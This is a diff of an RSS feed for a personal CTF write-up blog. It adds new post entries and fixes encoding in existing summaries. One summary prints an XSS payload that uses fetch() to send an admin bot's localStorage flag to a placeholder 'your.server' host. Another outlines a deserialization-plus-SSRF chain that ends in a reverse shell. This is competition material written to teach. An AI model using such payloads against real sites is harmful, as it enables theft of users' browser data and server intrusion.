@@ -7,15 +7,55 @@
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
     <copyright>CC Attribution-NonCommercial 4.0 International License</copyright>
-    <lastBuildDate>Tue, 26 Apr 2022 19:59:24 -0700</lastBuildDate><atom:link href="https://jamvie.net/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Tue, 16 Aug 2022 13:37:54 -0700</lastBuildDate><atom:link href="https://jamvie.net/index.xml" rel="self" type="application/rss+xml" />
     <item>
-      <title>b01lers CTF 2022: hacker/place</title>
+      <title>DEFCON 30: Retrospective</title>
+      <link>https://jamvie.net/posts/2022/08/defcon-30-retrospective/</link>
+      <pubDate>Tue, 16 Aug 2022 13:37:54 -0700</pubDate>
+      
+      <guid>https://jamvie.net/posts/2022/08/defcon-30-retrospective/</guid>
+      <description>Man.
+My team, Maple Bacon, collaborated with CMU&amp;rsquo;s CTF team PPP and Theori.io&amp;rsquo;s CTF team The Duck, forming Maple Mallard Magistrates as a merger to participate in DEF CON finals.
+The Beginning @PlaidCTF, @theori_io (The Duck), and @maplebaconctf are joining forces to play DEFCON as Maple Mallard Magistrates. Some PPP members also play on The Duck &amp;amp; Maple Bacon, so this allows all of us to keep playing on the same team.</description>
+    </item>
+    
+    <item>
+      <title>NahamCon CTF 2022</title>
+      <link>https://jamvie.net/posts/2022/05/nahamcon-ctf-2022/</link>
+      <pubDate>Mon, 02 May 2022 12:40:52 -0700</pubDate>
+      
+      <guid>https://jamvie.net/posts/2022/05/nahamcon-ctf-2022/</guid>
+      <description>Just in Time Maple Bacon played in NahamCon CTF 2022 this past weekend, which came as a surprise - we were fully planning on focusing our efforts onto AngstromCTF which overlapped, however, NahamCon CTF proved to be interesting and good-quality so a last-minute decision was made to participate in both. AngstromCTF is still underway, but in the awkward passage of time between my last week and weekend, I played in NahamCon CTF for a little bit of practice.</description>
+    </item>
+    
+    <item>
+      <title>B01lers CTF 2022: hacker/place</title>
       <link>https://jamvie.net/posts/2022/04/b01lers-ctf-2022-hacker/place/</link>
       <pubDate>Tue, 26 Apr 2022 19:59:24 -0700</pubDate>
       
       <guid>https://jamvie.net/posts/2022/04/b01lers-ctf-2022-hacker/place/</guid>
       <description>Thoughts This year&amp;rsquo;s b01lers CTF was a great one for Maple Bacon, given that we came in first. A fantastic development, especially since last year we landed in 7th, so we&amp;rsquo;ve certainly improved a great deal since then.
 While the balance of problems was skewed, the CTF was overall an enjoyable experience. It was nice to delve into the different problems outside of web (whilst waiting for the one (1) web challenge to release), which reminded me I really need to touch up on my reversing skills, a 2022 new year resolution that I wanted to get into.</description>
+    </item>
+    
+    <item>
+      <title>MapleCTF UBC ver. Introspective</title>
+      <link>https://jamvie.net/posts/2022/01/maplectf-ubc-ver.-introspective/</link>
+      <pubDate>Sun, 30 Jan 2022 22:00:18 -0800</pubDate>
+      
+      <guid>https://jamvie.net/posts/2022/01/maplectf-ubc-ver.-introspective/</guid>
+      <description>Jan 21-28 marked the inaugural MapleCTF: UBC version, Maple Bacon&amp;rsquo;s first CTF to hit the scene.
+For our very first, we wanted to keep it local. This made it very different from most other CTFs that one would be used to. We treated this as a beginner event - hoping to introduce the UBC community to the concept, well aware that we would have to cater to varying skill levels.</description>
+    </item>
+    
+    <item>
+      <title>2021: Wrapped</title>
+      <link>https://jamvie.net/posts/2021/12/2021-wrapped/</link>
+      <pubDate>Mon, 20 Dec 2021 22:37:46 -0800</pubDate>
+      
+      <guid>https://jamvie.net/posts/2021/12/2021-wrapped/</guid>
+      <description>Wow, everyone&amp;rsquo;s following along on Spotify&amp;rsquo;s year-wrapped idea. Data collection is so neat guys :)
+This post is somewhat ironic, given how busy I got this year with a bunch of things and not being able to find the time to update my blog. My original plans for this when I started in 2020 were to give a writeup for at least 1 challenge per CTF, and write a few other interesting articles that I figured may be worth reading.</description>
     </item>
     
     <item>
@@ -31,11 +71,11 @@ Recon The CSP is implemented via a meta-tag in the DOM, and not through response
     
     <item>
       <title>RaRCTF 2021: MAAS 2 &#43; Unintended Solutions</title>
-      <link>https://jamvie.net/posts/2021/08/rarctf-2021-maas-2-unintended-solutions/</link>
+      <link>https://jamvie.net/posts/2021/08/rarctf-2021-maas-2--unintended-solutions/</link>
       <pubDate>Fri, 20 Aug 2021 13:49:21 -0700</pubDate>
       
-      <guid>https://jamvie.net/posts/2021/08/rarctf-2021-maas-2-unintended-solutions/</guid>
-      <description>MAAS 2 // Notes Source was the same from MAAS 1 (and will be the same for MAAS 3). MAAS 2 involved the &amp;lsquo;notes&amp;rsquo; part of MAAS, where you are prompted to register a user and afterwards add key:val attributes to yourself, give yourself a bio, or transfer key:value attributes to another user.
+      <guid>https://jamvie.net/posts/2021/08/rarctf-2021-maas-2--unintended-solutions/</guid>
+      <description>MAAS 2 // Notes Source was the same from MAAS 1 (and will be the same for MAAS 3). MAAS 2 involved the &amp;rsquo;notes&amp;rsquo; part of MAAS, where you are prompted to register a user and afterwards add key:val attributes to yourself, give yourself a bio, or transfer key:value attributes to another user.
 The provided source has some interesting code:
 notes/app.py
 @app.route(&amp;#39;/useraction&amp;#39;, methods=[&amp;#34;POST&amp;#34;]) def useraction(): mode = request.form.get(&amp;#34;mode&amp;#34;) username = request.</description>
@@ -49,16 +89,16 @@ notes/app.py
       <guid>https://jamvie.net/posts/2021/08/rarctf2021-some-simpler-web-probz/</guid>
       <description>Fancy Button Generator // FBG A simple xss challenge with the slightest of twists: instead of stealing admin cookies, you&amp;rsquo;re stealing admin&amp;rsquo;s localstorage values. This was possible because the admin, which was a puppetteer chrome browser, was operating in no-sandbox mode.
 Insert as your payload:
-title: eh link: javascript:fetch(&#39;your.server?fleg=&#39;%2B(window.localStorage.getItem(&amp;quot;flag&amp;quot;))); And report to admin. Careful with the wait times&amp;hellip;
+title: eh link: javascript:fetch(&amp;#39;your.server?fleg=&amp;#39;%2B(window.localStorage.getItem(&amp;#34;flag&amp;#34;))); And report to admin. Careful with the wait times&amp;hellip;
 NOTE: I first-blooded this challenge before certain measures were implemented. There were some issues with FBG throughout the competition that involved the organizers making amendments and introducing a pow to help with the stability of the infrastructure.</description>
     </item>
     
     <item>
       <title>DEF CON Quals 2021: Getting Gud &#43; threefactooorx</title>
-      <link>https://jamvie.net/posts/2021/04/def-con-quals-2021-getting-gud-threefactooorx/</link>
+      <link>https://jamvie.net/posts/2021/04/def-con-quals-2021-getting-gud--threefactooorx/</link>
       <pubDate>Sun, 11 Apr 2021 00:07:54 -0600</pubDate>
       
-      <guid>https://jamvie.net/posts/2021/04/def-con-quals-2021-getting-gud-threefactooorx/</guid>
+      <guid>https://jamvie.net/posts/2021/04/def-con-quals-2021-getting-gud--threefactooorx/</guid>
       <description>AKA - How I spent some time reading custom partially-deobfuscated javascript code and actually used the Chrome debugger for once
 DEF CON - undoubtedly the most notorious, famous and recgonized CTF out there. Even people who don&amp;rsquo;t do hacking know about DEF CON. The qualifiers, an event that took place this last weekend, ran for roughly 2 days and had 1 web challenge - which was more like reversing, but I&amp;rsquo;ll take what I can get.</description>
     </item>
@@ -102,7 +142,7 @@ Fastfox (easy way) Intended (hard) solution was escalating a JIT bug, which I wi
       
       <guid>https://jamvie.net/posts/2021/02/dicectf-2021/</guid>
       <description>Babier CSP The challenge takes after justCTF&amp;rsquo;s similarly named challenge. We&amp;rsquo;re given an index.js file:
-const express = require(&amp;#39;express&amp;#39;); const crypto = require(&amp;#34;crypto&amp;#34;); const config = require(&amp;#34;./config.js&amp;#34;); const app = express() const port = process.env.port || 3000; const SECRET = config.secret; const NONCE = crypto.randomBytes(16).toString(&amp;#39;base64&amp;#39;); const template = name =&amp;gt; ` &amp;lt;html&amp;gt; ${name === &amp;#39;&amp;#39; ? &amp;#39;&amp;#39;: `&amp;lt;h1&amp;gt;${name}&amp;lt;/h1&amp;gt;`}&amp;lt;a href=&amp;#39;#&amp;#39; id=elem&amp;gt;View Fruit&amp;lt;/a&amp;gt; &amp;lt;script nonce=${NONCE}&amp;gt; elem.onclick = () =&amp;gt; { location = &amp;#34;/?</description>
+const express = require(&amp;#39;express&amp;#39;); const crypto = require(&amp;#34;crypto&amp;#34;); const config = require(&amp;#34;./config.js&amp;#34;); const app = express() const port = process.env.port || 3000; const SECRET = config.secret; const NONCE = crypto.randomBytes(16).toString(&amp;#39;base64&amp;#39;); const template = name =&amp;gt; ` &amp;lt;html&amp;gt; ${name === &amp;#39;&amp;#39; ? &amp;#39;&amp;#39;: `&amp;lt;h1&amp;gt;${name}&amp;lt;/h1&amp;gt;`} &amp;lt;a href=&amp;#39;#&amp;#39; id=elem&amp;gt;View Fruit&amp;lt;/a&amp;gt; &amp;lt;script nonce=${NONCE}&amp;gt; elem.onclick = () =&amp;gt; { location = &amp;#34;/?</description>
     </item>
     
     <item>
@@ -143,7 +183,7 @@ Context What Even is Serialization? My CPSC210 class I learned the fundamentals 
       
       <guid>https://jamvie.net/posts/2020/11/dragonctf-2020-harmony-chat/</guid>
       <description>A writeup for the first web problem, &amp;ldquo;Harmony Chat&amp;rdquo;, in DragonCTF 2020. A very fun and interesting challenge!
-TL;DR  Application is vulnerable to RCE via insecure deserialization on the /csp-report endpoint Use FTP active mode to SSRF a post request to /csp-report that would open a reverse shell on the application&amp;rsquo;s HTTP server Cat flag for profit  Let&amp;rsquo;s Begin! The Harmony Chat is a Discord-esque chat app where you can /register an account and create channels.</description>
+TL;DR Application is vulnerable to RCE via insecure deserialization on the /csp-report endpoint Use FTP active mode to SSRF a post request to /csp-report that would open a reverse shell on the application&amp;rsquo;s HTTP server Cat flag for profit Let&amp;rsquo;s Begin! The Harmony Chat is a Discord-esque chat app where you can /register an account and create channels.</description>
     </item>
     
     <item>
@@ -175,6 +215,15 @@ Let&amp;rsquo;s Begin! The confessions webpage was a message-generation applicat
     </item>
     
     <item>
+      <title>GoogleCTF 2020: All the Little Things, Post-CTF Reflection</title>
+      <link>https://jamvie.net/posts/2020/08/googlectf-2020-all-the-little-things-post-ctf-reflection/</link>
+      <pubDate>Mon, 24 Aug 2020 20:17:24 -0600</pubDate>
+      
+      <guid>https://jamvie.net/posts/2020/08/googlectf-2020-all-the-little-things-post-ctf-reflection/</guid>
+      <description>&lt;p&gt;The 2nd challenge I worked on, titled &amp;ldquo;All the little things&amp;rdquo;. Frustratingly, I didn&amp;rsquo;t solve this challenge. I was about &lt;strong&gt;85%&lt;/strong&gt; of the way there!&lt;/p&gt;</description>
+    </item>
+    
+    <item>
       <title>GoogleCTF 2020: Pasteurize</title>
       <link>https://jamvie.net/posts/2020/08/googlectf-2020-pasteurize/</link>
       <pubDate>Sun, 23 Aug 2020 17:35:14 -0600</pubDate>
@@ -182,7 +231,7 @@ Let&amp;rsquo;s Begin! The confessions webpage was a message-generation applicat
       <guid>https://jamvie.net/posts/2020/08/googlectf-2020-pasteurize/</guid>
       <description>This is the first challenge I worked on. I will soon upload a post on the second one. I completed this challenge with the help of my team mentor!
 Let&amp;rsquo;s Begin! The challenge lets us load into the DOM whatever we want through this pastebin-esque function. When you make a note, you have an option to share it with a &amp;ldquo;TjMike&amp;rdquo; Entity. Sign of XSS/CSRF attacks?
- My input, &amp;ldquo;uwu&amp;rdquo;, is shoved into a javascript string variable called &amp;lsquo;note&amp;rsquo;.</description>
+My input, &amp;ldquo;uwu&amp;rdquo;, is shoved into a javascript string variable called &amp;rsquo;note&amp;rsquo;.</description>
     </item>
     
     <item>
@@ -233,8 +282,8 @@ The source code is available for us in this challenge as well. The main file, se
       
       <guid>https://jamvie.net/posts/2020/06/redpwnctf-2020-part-2/</guid>
       <description>Part 2 of my writeup series for RedPwnCTF 2020!
-Let&amp;rsquo;s Begin! Tux-Fanpage  points: 464  Ignoring the 1990&amp;rsquo;s aesthetic of the page, observe the provided script:
-const express = require(&amp;#39;express&amp;#39;) const path = require(&amp;#39;path&amp;#39;) const app = express() //Don&amp;#39;t forget to redact from published source const flag = &amp;#39;[REDACTED]&amp;#39; app.get(&amp;#39;/&amp;#39;, (req, res) =&amp;gt; { res.redirect(&amp;#39;/page?path=index.html&amp;#39;) }) app.get(&amp;#39;/page&amp;#39;, (req, res) =&amp;gt; { let path = req.query.path //Handle queryless request  if(!</description>
+Let&amp;rsquo;s Begin! Tux-Fanpage points: 464 Ignoring the 1990&amp;rsquo;s aesthetic of the page, observe the provided script:
+const express = require(&amp;#39;express&amp;#39;) const path = require(&amp;#39;path&amp;#39;) const app = express() //Don&amp;#39;t forget to redact from published source const flag = &amp;#39;[REDACTED]&amp;#39; app.get(&amp;#39;/&amp;#39;, (req, res) =&amp;gt; { res.redirect(&amp;#39;/page?path=index.html&amp;#39;) }) app.get(&amp;#39;/page&amp;#39;, (req, res) =&amp;gt; { let path = req.query.path //Handle queryless request if(!path || !strip(path)){ res.</description>
     </item>
     
     <item>
